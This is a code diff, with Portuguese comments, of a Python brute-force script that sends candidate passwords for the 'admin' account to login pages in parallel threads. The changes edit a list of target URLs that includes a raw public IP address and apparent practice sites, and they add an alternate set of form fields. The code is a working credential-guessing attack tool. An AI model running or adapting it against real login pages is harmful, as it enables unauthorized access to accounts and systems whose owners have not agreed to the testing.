@@ -12,14 +12,19 @@ from requests import post
 from colorama import Fore
 from threading import Thread
 
+# URL TESTE
+#url = "http://127.0.0.1/4/login.php"
+#url = "http://44.203.221.183/admin/index.php"
+#url = "http://44.203.221.183/admin/index.php"
+#url = "http://testphp.vulnweb.com/userinfo.php"
+url = "http://advanced.bancocn.com/admin/index.php"
+
+
 # Variaveis globais
 CONT = 0                    # Contadores de senhas
 SENHAS_TESTADAS = set()     # Conjunto
 SENHA_ENCONTRADA = False    # Flag
 
-#url = "http://127.0.0.1/4/login.php"
-#url = "http://44.203.221.183/admin/index.php"
-url = "http://advanced.bancocn.com/admin/index.php"
 
 def analise(resp, data):
 
@@ -67,13 +72,14 @@ def execucao():
                 else:
                     data = {"user": "admin", "password": i}
                     #data = {"username": "admin", "password": i}
+                    #data = {"uname": "test", "pass": i}
 
                     # Requisicao POST + Entrada de dados
                     resp = post(url, data)
                     analise(resp, data)
 
     except NameError as e:
-        print(e)
+        print(f"Variaveis erradas: {e}")
 
     except Exception as e:
         print(f"Erro {e}")
@@ -83,7 +89,6 @@ def execucao():
         exit(0)
 
 
-# Metodo: Principal
 def main():
 
     try:
@@ -105,6 +110,7 @@ def main():
 
     except Exception as e:
         print(f"Erro: {e}")
+
 
 # Execucao
 if __name__ == '__main__':
